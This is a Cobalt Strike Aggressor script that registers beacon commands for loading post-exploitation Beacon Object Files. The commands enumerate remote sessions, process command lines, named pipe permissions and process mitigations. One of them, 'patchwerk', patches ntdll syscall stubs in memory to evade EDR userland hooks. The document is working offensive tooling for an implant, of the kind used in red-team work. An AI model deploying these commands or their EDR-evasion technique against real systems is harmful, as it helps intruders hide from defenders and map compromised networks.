beacon_command_register(
    "getTime", 
    "Gets the local and system time.",
    "Synopsis: getTime"
);
alias getTime {
    local('$handle $data $args');
    beacon_inline_execute($1, readbof($1, "getTime"), "go", $args);
}

beacon_command_register(
    "detectHooks", 
    "Detect if there are EDR User-Land hooks for syscall stubs in NTDLL",
    "Synopsis: detectHooks"
);
alias detectHooks {
    local('$handle $data $args');
    beacon_inline_execute($1, readbof($1, "detectHooks"), "go", $args);
}

beacon_command_register(
    "readProcess", 
    "get information from remote process",
    "Synopsis: readProcess PID"
);

alias readProcess {
    if(size(@_) == 1)
    {
        $2 = -1
    }
    if(size(@_) >= 3)
    {
        berror($1, "Incorrect usage!");
        berror($1, beacon_command_detail("readProcess"));
        return;
    }
    local('$handle $data $args');
    $args = bof_pack($1, "i",$2);
    beacon_inline_execute($1, readbof($1, "readProcess"), "go", $args);
}

beacon_command_register(
    "listSessions", 
    "list sessions on a remote computer.",
    "Synopsis: listSessions <HOST>"
);
alias listSessions {
    if(size(@_) != 2)
    {
        berror($1, "Incorrect usage!");
        berror($1, beacon_command_detail("listSessions"));
        return;
    }
    local('$handle $data $args');

    #$handle = openf(script_resource("listSessions.o"));
    #$data = readb($handle, -1);
    #closef($handle);

    $args = bof_pack($1,"z",$2);

    #btask($1, "this is sessionHunter");
    #beacon_inline_execute($1, $data, "kamehameha", $args);
    beacon_inline_execute($1, readbof($1, "listSessions"), "kamehameha", $args);
}

beacon_command_register(
    "getCli", 
    "get the CLI string for a PID",
    "Synopsis: getCli PID"
);

alias getCli {
    if(size(@_) == 1)
    {
        $2 = -1
    }
    if(size(@_) >= 3)
    {
        berror($1, "Incorrect usage!");
        berror($1, beacon_command_detail("getCli"));
        return;
    }
    local('$handle $data $args');
    $args = bof_pack($1, "i",$2);
    beacon_inline_execute($1, readbof($1, "getCli"), "go", $args);
}

beacon_command_register(
    "patchwerk", 
    "Patches ntdll system call stubs in memory to evade userland hooks",
    "Synopsis: patchwerk PID"
);

alias patchwerk {
    if(size(@_) == 1)
    {
        $2 = -1
    }
    if(size(@_) >= 3)
    {
        berror($1, "Incorrect usage!");
        berror($1, beacon_command_detail("patchwerk"));
        return;
    }
    local('$handle $data $args');
    #$handle = openf(script_resource("patchwerk.o"));
    #$data = readb($handle, -1);
    #closef($handle);
    $args = bof_pack($1, "i",$2);
    btask($1, "Patchwerk (Bobby Cooke|@0xBoku|github.com/boku7)");
    #beacon_inline_execute($1, $data, "go", $args);

    beacon_inline_execute($1, readbof($1, "patchwerk"), "go", $args);
}

beacon_command_register(
    "xpipe", 
    "List pipes and get their DACL permissions",
    "Synopsis: xpipe \\\\.\\pipe\\atsvc"
);

alias xpipe {
    if(size(@_) == 1)
    {
        $2 = "L"
    }
    if(size(@_) >= 3)
    {
        berror($1, "Incorrect usage!");
        berror($1, beacon_command_detail("xpipe"));
        return;
    }
    local('$handle $data $args');
    #$handle = openf(script_resource("xpipe.o"));
    #$data = readb($handle, -1);
    #closef($handle);
    $args = bof_pack($1, "z",$2);
    btask($1, "xpipe (IBM X-Force Red|Bobby Cooke|@0xBoku)");
    #beacon_inline_execute($1, $data, "go", $args);
    beacon_inline_execute($1, readbof($1, "xpipe"), "go", $args);
}


sub readbof {
	local('$barch $handle $data ');
	$barch  = barch($1);

	# read in the right BOF file
    println(script_resource("src/module/ $+ $2 $+ / $+ $2 $+ . $+ x64 $+ .o"));
	$handle = openf(script_resource("src/module/ $+ $2 $+ / $+ $2 $+ . $+ x64 $+ .o"));
	$data   = readb($handle, -1);
	closef($handle);
	if(strlen($data) == 0)
	{
		berror($1, "could not read bof file");
	}
	return $data;
}



beacon_command_register(
    "checkProcessMitigations", 
    "Check if process has a Dynamic Code Process Mitigation Policy",
    "Synopsis: checkProcessMitigations <pid>"
);

# $1 - beacon id
alias checkProcessMitigations {
	local('$barch $handle $data $args');

    if(size(@_) <= 1)
    {
        berror($1, "Incorrect usage");
        berror($1, beacon_command_detail("checkProcessMitigations"));
        return;
    }


	# figure out the arch of this session
	$barch  = barch($1);

	
	# read in the right BOF file
	$handle = openf(script_resource("src/module/checkProcessMitigations/checkProcessMitigations. $+ $barch $+ .o"));
	$data   = readb($handle, -1);
	closef($handle);
	
	# pack our arguments
	$args   = bof_pack($1, "i", $2);
	
	# announce what we're doing
	btask($1, "Checking Process Mitigation");
	
	# execute it.
	beacon_inline_execute($1, $data, "go", $args);
}